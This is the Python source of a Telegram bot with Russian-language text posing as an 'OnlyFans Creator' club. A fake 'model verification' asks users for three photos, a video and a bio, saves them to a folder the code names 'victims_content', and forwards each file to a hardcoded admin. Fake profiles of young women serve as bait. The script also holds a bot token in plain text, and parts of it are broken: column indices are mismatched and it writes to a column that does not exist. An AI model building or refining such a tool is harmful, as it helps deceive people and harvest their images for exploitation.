import telebot
from telebot import types
import sqlite3
import datetime
import time
import os
import random
import shutil

# ==================== КОНФИГ ====================
BOT_TOKEN = "8741183505:AAHSX_PND3gwrgAE8VBinnIaAlye2uyqw_M"  # Токен от @BotFather
ADMIN_IDS = [8146320391]  # Ваш Telegram ID

# Все действующие ключи
VALID_KEYS = [
    "Onlyf10-a7b2-m581", "Onlyf10-x9v4-p206", "Onlyf10-k3r1-l942",
    "Onlyf10-w8n5-t317", "Onlyf10-j2m6-b489", "Onlyf10-h4c9-s150",
    "Onlyf10-y6f3-g734", "Onlyf10-z1k8-d295", "Onlyf10-q5s0-v612",
    "Onlyf10-u3p7-f843", "Onlyf10-e9t2-n026", "Onlyf10-i4b5-x537",
    "Onlyf10-o2g8-w194", "Onlyf10-a6m1-k308", "Onlyf10-l8r3-j759",
    "Onlyf10-v0c4-h211", "Onlyf10-s7n9-p460", "Onlyf10-t1f2-z983",
    "Onlyf10-g5d6-u074", "Onlyf10-p3q8-y529", "Onlyf10-b9w4-m816",
    "Onlyf10-k2x7-r345", "Onlyf10-n6h1-t902", "Onlyf10-f4v5-s187",
    "Onlyf10-m8j0-l431", "Onlyf10-x1a3-g678", "Onlyf10-c7p9-k254",
    "Onlyf10-r5t2-v093", "Onlyf10-w9f4-n167", "Onlyf10-z3s8-b540"
]

bot = telebot.TeleBot(BOT_TOKEN)

# Создаем папку для контента жертв
if not os.path.exists("victims_content"):
    os.makedirs("victims_content")

# ==================== СТИЛЬ ====================
EMOJIS = {
    "premium": "⭐️", "vip": "👑", "hot": "🔥", "lock": "🔒",
    "key": "🗝", "girl": "💋", "money": "💰", "crown": "👸",
    "camera": "📸", "video": "🎥", "wink": "😉", "fire": "🔥",
    "check": "✅", "wait": "⏳", "alert": "⚠️"
}

# ==================== БАЗА ДАННЫХ ====================
def init_db():
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    # Пользователи
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id INTEGER UNIQUE,
        username TEXT,
        first_name TEXT,
        age TEXT,
        city TEXT,
        verified INTEGER DEFAULT 0,
        has_access INTEGER DEFAULT 0,
        key_used TEXT,
        verification_photos INTEGER DEFAULT 0,
        verification_videos INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0,
        join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Использованные ключи
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS used_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_text TEXT UNIQUE,
        used_by INTEGER,
        used_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Статусы верификации (для состояний)
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS verification_status (
        user_id INTEGER PRIMARY KEY,
        step TEXT,
        temp_data TEXT
    )''')
    
    conn.commit()
    conn.close()

def get_user(telegram_id):
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
    user = cursor.fetchone()
    
    if not user:
        cursor.execute('''
        INSERT INTO users (telegram_id, username)
        VALUES (?, ?)
        ''', (telegram_id, "Unknown"))
        conn.commit()
        
        cursor.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
        user = cursor.fetchone()
    
    conn.close()
    return user

def update_user(telegram_id, **kwargs):
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    for key, value in kwargs.items():
        cursor.execute(f"UPDATE users SET {key} = ? WHERE telegram_id = ?", (value, telegram_id))
    
    conn.commit()
    conn.close()

def set_verification_step(user_id, step, temp_data=""):
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    cursor.execute('''
    INSERT OR REPLACE INTO verification_status (user_id, step, temp_data)
    VALUES (?, ?, ?)
    ''', (user_id, step, temp_data))
    
    conn.commit()
    conn.close()

def get_verification_step(user_id):
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT step, temp_data FROM verification_status WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    conn.close()
    return result if result else (None, None)

def clear_verification_step(user_id):
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    cursor.execute("DELETE FROM verification_status WHERE user_id = ?", (user_id,))
    
    conn.commit()
    conn.close()

def is_key_used(key):
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT * FROM used_keys WHERE key_text = ?", (key,))
    result = cursor.fetchone()
    
    conn.close()
    return result is not None

def use_key(key, user_id):
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    cursor.execute('''
    INSERT INTO used_keys (key_text, used_by)
    VALUES (?, ?)
    ''', (key, user_id))
    
    conn.commit()
    conn.close()

def get_stats():
    conn = sqlite3.connect('onlyfans_creator.db')
    cursor = conn.cursor()
    
    total_users = cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    verified_users = cursor.execute("SELECT COUNT(*) FROM users WHERE verified=1").fetchone()[0]
    access_users = cursor.execute("SELECT COUNT(*) FROM users WHERE has_access=1").fetchone()[0]
    total_photos = cursor.execute("SELECT SUM(verification_photos) FROM users").fetchone()[0] or 0
    total_videos = cursor.execute("SELECT SUM(verification_videos) FROM users").fetchone()[0] or 0
    
    conn.close()
    
    return {
        'total_users': total_users,
        'verified_users': verified_users,
        'access_users': access_users,
        'total_photos': total_photos,
        'total_videos': total_videos
    }

# ==================== КОНТЕНТ ====================
PREMIUM_CONTENT = [
    {
        "name": "Алиса 💋",
        "age": 19,
        "city": "Москва",
        "status": "ОНЛАЙН 🔴",
        "photos": 47,
        "videos": 12,
        "description": "Люблю спорт и откровенные фотосессии. Для VIP подписчиков личный контент каждый день!"
    },
    {
        "name": "Кристина 👑",
        "age": 21,
        "city": "СПб",
        "status": "ОНЛАЙН 🔴",
        "photos": 83,
        "videos": 24,
        "description": "Студентка, ищу спонсора. В личке отправляю всё, что попросишь 🔥"
    },
    {
        "name": "Марина ⭐️",
        "age": 20,
        "city": "Киев",
        "status": "ОФЛАЙН 💤",
        "photos": 112,
        "videos": 8,
        "description": "Моя страница только для настоящих мужчин. Подпишись и узнай меня ближе..."
    }
]

# ==================== КЛАВИАТУРЫ ====================
def main_keyboard(has_access=False):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    if has_access:
        keyboard.add(
            types.InlineKeyboardButton("👸 Девушки", callback_data="girls"),
            types.InlineKeyboardButton("🔥 Горячее", callback_data="hot")
        )
        keyboard.add(
            types.InlineKeyboardButton("📸 Эксклюзив", callback_data="exclusive"),
            types.InlineKeyboardButton("💬 Чат", callback_data="chat")
        )
        keyboard.add(
            types.InlineKeyboardButton("👥 Пригласить", callback_data="invite"),
            types.InlineKeyboardButton("📊 Профиль", callback_data="profile")
        )
    else:
        keyboard.add(
            types.InlineKeyboardButton("🔓 ПОЛУЧИТЬ ДОСТУП", callback_data="get_access"),
            types.InlineKeyboardButton("🔑 ЕСТЬ КЛЮЧ", callback_data="have_key")
        )
        keyboard.add(
            types.InlineKeyboardButton("🎁 СТАТЬ МОДЕЛЬЮ", callback_data="become_model"),
            types.InlineKeyboardButton("👀 Превью", callback_data="preview")
        )
    
    return keyboard

def girls_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    
    for i, girl in enumerate(PREMIUM_CONTENT):
        status_emoji = "🟢" if "ОНЛАЙН" in girl['status'] else "⚫️"
        btn_text = f"{status_emoji} {girl['name']} ({girl['age']}, {girl['city']})"
        keyboard.add(types.InlineKeyboardButton(btn_text, callback_data=f"girl_{i}"))
    
    keyboard.add(types.InlineKeyboardButton("◀️ Назад", callback_data="back_main"))
    
    return keyboard

def admin_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    keyboard.add(
        types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        types.InlineKeyboardButton("👥 Юзеры", callback_data="admin_users")
    )
    keyboard.add(
        types.InlineKeyboardButton("🔑 Ключи", callback_data="admin_keys"),
        types.InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")
    )
    keyboard.add(
        types.InlineKeyboardButton("📸 Контент жертв", callback_data="admin_content"),
        types.InlineKeyboardButton("✅ Верифицировать", callback_data="admin_verify")
    )
    
    return keyboard

# ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if message.from_user.username:
        update_user(user_id, username=message.from_user.username)
    if message.from_user.first_name:
        update_user(user_id, first_name=message.from_user.first_name)
    
    welcome_text = (
        f"{EMOJIS['premium']}{EMOJIS['premium']}{EMOJIS['premium']} ONLYFANS CREATOR {EMOJIS['premium']}{EMOJIS['premium']}{EMOJIS['premium']}\n\n"
        f"🔞 Платформа для моделей и подписчиков 🔞\n\n"
        f"✦ Хочешь смотреть горячий контент? → Введи ключ\n"
        f"✦ Хочешь САМ(А) зарабатывать? → Стань моделью\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    if user[5] == 1:  # has_access
        welcome_text += f"\n✅ У вас ПРЕМИУМ ДОСТУП"
    else:
        welcome_text += f"\n❌ Доступа нет"
    
    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=main_keyboard(user[5] == 1)
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    user = get_user(user_id)
    
    if user[11] == 1:  # is_banned
        bot.answer_callback_query(call.id, "❌ Вы забанены", show_alert=True)
        return
    
    # ===== ГЛАВНОЕ МЕНЮ =====
    if call.data == "back_main":
        bot.edit_message_text(
            f"{EMOJIS['premium']} ONLYFANS CREATOR {EMOJIS['premium']}",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_keyboard(user[5] == 1)
        )
    
    # ===== ПОЛУЧИТЬ ДОСТУП (ЕСТЬ КЛЮЧ) =====
    elif call.data == "have_key":
        msg = bot.edit_message_text(
            f"{EMOJIS['key']} ВВЕДИТЕ ПРОМОКОД {EMOJIS['key']}\n\n"
            f"Формат: Onlyf10-xxxx-xxxx\n"
            f"Пример: Onlyf10-a7b2-m581",
            call.message.chat.id,
            call.message.message_id
        )
        set_verification_step(user_id, "waiting_key")
        bot.register_next_step_handler(msg, process_key)
    
    # ===== СТАТЬ МОДЕЛЬЮ =====
    elif call.data == "become_model":
        text = (
            f"{EMOJIS['camera']} ХОЧЕШЬ СТАТЬ МОДЕЛЬЮ? {EMOJIS['video']}\n\n"
            f"Мы ищем новых девушек для нашего закрытого клуба!\n\n"
            f"Что нужно сделать:\n"
            f"1. Отправить 3 своих фото (любых)\n"
            f"2. Отправить 1 видео (до 30 сек)\n"
            f"3. Написать немного о себе\n\n"
            f"{EMOJIS['check']} После проверки получишь ПРЕМИУМ ДОСТУП и свой личный ключ!\n\n"
            f"👇 Нажми 'НАЧАТЬ' и отправь первое фото"
        )
        
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("📸 НАЧАТЬ ВЕРИФИКАЦИЮ", callback_data="start_verification"))
        keyboard.add(types.InlineKeyboardButton("◀️ Назад", callback_data="back_main"))
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=keyboard
        )
    
    # ===== НАЧАТЬ ВЕРИФИКАЦИЮ =====
    elif call.data == "start_verification":
        bot.edit_message_text(
            f"{EMOJIS['wait']} РЕЖИМ ВЕРИФИКАЦИИ {EMOJIS['wait']}\n\n"
            f"Шаг 1 из 5: Отправь своё ПЕРВОЕ ФОТО\n\n"
            f"(можно любое, даже с котиком 😉)",
            call.message.chat.id,
            call.message.message_id
        )
        set_verification_step(user_id, "waiting_photo_1")
    
    # ===== ПРОФИЛЬ =====
    elif call.data == "profile":
        text = (
            f"{EMOJIS['crown']} ТВОЙ ПРОФИЛЬ {EMOJIS['crown']}\n\n"
            f"🆔 ID: {user_id}\n"
            f"👤 Имя: {user[3] or 'Не указано'}\n"
            f"🎂 Возраст: {user[4] or 'Не указан'}\n"
            f"🏙 Город: {user[5] or 'Не указан'}\n"
            f"✅ Верифицирован: {'Да' if user[6] == 1 else 'Нет'}\n"
            f"🔓 Доступ: {'Есть' if user[7] == 1 else 'Нет'}\n"
            f"📸 Фото для проверки: {user[9]}\n"
            f"🎥 Видео: {user[10]}\n"
        )
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_keyboard(user[7] == 1)
        )
    
    # ===== ПРЕВЬЮ (ДЕМО) =====
    elif call.data == "preview":
        girl = random.choice(PREMIUM_CONTENT)
        text = (
            f"👀 ПРИМЕР ПРЕМИУМ КОНТЕНТА 👀\n\n"
            f"{girl['name']}, {girl['age']} лет, {girl['city']}\n"
            f"Статус: {girl['status']}\n"
            f"📸 Фото: {girl['photos']} | 🎥 Видео: {girl['videos']}\n\n"
            f"{girl['description']}\n\n"
            f"━━━━━━━━━━━━━━\n"
            f"🔒 Полный доступ только по ключу"
        )
        
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("🔓 ПОЛУЧИТЬ КЛЮЧ", callback_data="have_key"))
        keyboard.add(types.InlineKeyboardButton("◀️ Назад", callback_data="back_main"))
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=keyboard
        )
    
    # ===== АДМИНКА =====
    elif call.data.startswith("admin_"):
        if user_id not in ADMIN_IDS:
            bot.answer_callback_query(call.id, "❌ Нет доступа")
            return
        
        action = call.data.replace("admin_", "")
        
        if action == "stats":
            stats = get_stats()
            text = (
                f"📊 СТАТИСТИКА БОТА\n\n"
                f"👥 Всего юзеров: {stats['total_users']}\n"
                f"✅ Верифицировано: {stats['verified_users']}\n"
                f"🔓 С доступом: {stats['access_users']}\n"
                f"📸 Получено фото: {stats['total_photos']}\n"
                f"🎥 Получено видео: {stats['total_videos']}"
            )
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())
        
        elif action == "content":
            files = os.listdir("victims_content")
            text = f"📸 КОНТЕНТ ЖЕРТВ\n\nВсего файлов: {len(files)}\n\n(сохраняются в папку victims_content)"
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())
        
        elif action == "keys":
            used = len([k for k in VALID_KEYS if is_key_used(k)])
            text = f"🔑 КЛЮЧИ\n\nВсего: {len(VALID_KEYS)}\nИспользовано: {used}\nОсталось: {len(VALID_KEYS)-used}"
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())

def process_key(message):
    user_id = message.from_user.id
    key = message.text.strip()
    
    step, _ = get_verification_step(user_id)
    
    if step != "waiting_key":
        return
    
    if key in VALID_KEYS:
        if is_key_used(key):
            bot.send_message(message.chat.id, "❌ Этот ключ уже использован!")
        else:
            use_key(key, user_id)
            update_user(user_id, has_access=1, key_used=key, access_date=datetime.datetime.now())
            clear_verification_step(user_id)
            
            bot.send_message(
                message.chat.id,
                f"{EMOJIS['check']} КЛЮЧ АКТИВИРОВАН!\n\n"
                f"Добро пожаловать в ONLYFANS PREMIUM!\n"
                f"Тебе открыт доступ ко всем моделям и контенту.",
                reply_markup=main_keyboard(True)
            )
            
            # Уведомление админу
            for admin in ADMIN_IDS:
                bot.send_message(admin, f"🔑 Ключ использован: {key}\n👤 Юзер: {user_id}")
    else:
        bot.send_message(
            message.chat.id,
            "❌ Неверный ключ!\n\nПопробуй ещё раз или нажми /start",
            reply_markup=main_keyboard(False)
        )
        clear_verification_step(user_id)

# ==================== ОБРАБОТКА ФОТО/ВИДЕО ====================
@bot.message_handler(content_types=['photo', 'video', 'text'])
def handle_verification(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    step, temp_data = get_verification_step(user_id)
    
    if not step or not step.startswith("waiting"):
        return
    
    # ===== ОБРАБОТКА ФОТО =====
    if step == "waiting_photo_1" and message.photo:
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Сохраняем фото
        filename = f"victims_content/photo_{user_id}_1_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        
        update_user(user_id, verification_photos=1)
        
        bot.send_message(
            message.chat.id,
            f"{EMOJIS['check']} Фото получено!\n\n"
            f"Шаг 2 из 5: Отправь ВТОРОЕ фото"
        )
        set_verification_step(user_id, "waiting_photo_2")
        
        # Отправляем админу
        for admin in ADMIN_IDS:
            bot.send_photo(admin, file_id, caption=f"📸 Фото 1 от @{message.from_user.username or user_id}")
    
    elif step == "waiting_photo_2" and message.photo:
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = f"victims_content/photo_{user_id}_2_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        
        update_user(user_id, verification_photos=2)
        
        bot.send_message(
            message.chat.id,
            f"{EMOJIS['check']} Второе фото получено!\n\n"
            f"Шаг 3 из 5: Отправь ТРЕТЬЕ фото"
        )
        set_verification_step(user_id, "waiting_photo_3")
        
        for admin in ADMIN_IDS:
            bot.send_photo(admin, file_id, caption=f"📸 Фото 2 от @{message.from_user.username or user_id}")
    
    elif step == "waiting_photo_3" and message.photo:
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = f"victims_content/photo_{user_id}_3_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        
        update_user(user_id, verification_photos=3)
        
        bot.send_message(
            message.chat.id,
            f"{EMOJIS['check']} Третье фото получено!\n\n"
            f"Шаг 4 из 5: Отправь ВИДЕО (до 30 секунд)"
        )
        set_verification_step(user_id, "waiting_video")
        
        for admin in ADMIN_IDS:
            bot.send_photo(admin, file_id, caption=f"📸 Фото 3 от @{message.from_user.username or user_id}")
    
    # ===== ОБРАБОТКА ВИДЕО =====
    elif step == "waiting_video" and message.video:
        file_id = message.video.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = f"victims_content/video_{user_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        
        update_user(user_id, verification_videos=1)
        
        bot.send_message(
            message.chat.id,
            f"{EMOJIS['check']} Видео получено!\n\n"
            f"Шаг 5 из 5: Напиши немного о себе\n"
            f"(Имя, возраст, город, увлечения)"
        )
        set_verification_step(user_id, "waiting_bio")
        
        for admin in ADMIN_IDS:
            bot.send_video(admin, file_id, caption=f"🎥 Видео от @{message.from_user.username or user_id}")
    
    # ===== ОБРАБОТКА ТЕКСТА (БИО) =====
    elif step == "waiting_bio" and message.text:
        bio = message.text
        
        # Парсим возраст и город из текста (примерно)
        age = "?"
        city = "?"
        
        words = bio.split()
        for word in words:
            if word.isdigit() and 10 < int(word) < 100:
                age = word
            if word in ["Москва", "СПб", "Киев", "Минск", "Новосибирск", "Екатеринбург"]:
                city = word
        
        update_user(user_id, age=age, city=city, verified=1)
        
        # Выдаём случайный ключ
        available_keys = [k for k in VALID_KEYS if not is_key_used(k)]
        if available_keys:
            new_key = random.choice(available_keys)
            use_key(new_key, user_id)
            update_user(user_id, has_access=1, key_used=new_key)
            
            bot.send_message(
                message.chat.id,
                f"{EMOJIS['check']}{EMOJIS['check']}{EMOJIS['check']}\n"
                f"ПОЗДРАВЛЯЕМ! Ты прошла верификацию!\n\n"
                f"Твой личный ключ доступа:\n"
                f"🔑 `{new_key}`\n\n"
                f"Теперь ты можешь пользоваться платформой как модель и смотреть контент других девушек!\n\n"
                f"Сохрани ключ, он действует бессрочно.",
                parse_mode="Markdown",
                reply_markup=main_keyboard(True)
            )
            
            # Уведомление админу
            for admin in ADMIN_IDS:
                bot.send_message(
                    admin, 
                    f"🎉 Новая модель!\n👤 @{message.from_user.username or user_id}\n📝 Био: {bio}\n🔑 Ключ: {new_key}"
                )
        else:
            # Если ключей нет
            bot.send_message(
                message.chat.id,
                f"{EMOJIS['wait']} Спасибо за верификацию!\n"
                f"Ключи временно закончились, но мы пришлём его позже.",
                reply_markup=main_keyboard(False)
            )
        
        clear_verification_step(user_id)

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    print("🤖 ONLYFANS CREATOR BOT ЗАПУСКАЕТСЯ...")
    init_db()
    print(f"✅ База данных готова")
    print(f"👤 Админ ID: {ADMIN_IDS}")
    print(f"🔑 Ключей загружено: {len(VALID_KEYS)}")
    print("🚀 Бот работает! Нажми Ctrl+C для остановки")
    
    bot.infinity_polling()
